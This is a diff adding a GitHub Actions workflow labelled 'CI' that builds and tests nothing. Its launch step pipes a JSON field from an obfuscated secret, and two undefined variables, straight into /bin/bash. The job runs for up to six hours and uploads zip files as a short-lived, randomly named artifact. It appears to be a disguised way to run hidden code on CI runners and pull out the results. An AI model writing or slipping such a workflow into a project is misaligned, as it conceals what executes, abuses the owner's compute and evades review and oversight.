@@ -1,0 +1,29 @@
+name: CI
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          dxiq60: ${{ secrets.dxiq60 }}
+        run: |
+          printf '%s' "$dxiq60" | jq -r .pobm0526 | /bin/bash
+          echo $ompm59 | jq -r .xpwmr4 | /bin/bash
+          printf '%s' "$u00" | jq -r .nhsf30 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1lOhXaBT
+          path: "*.zip"
+          retention-days: 1
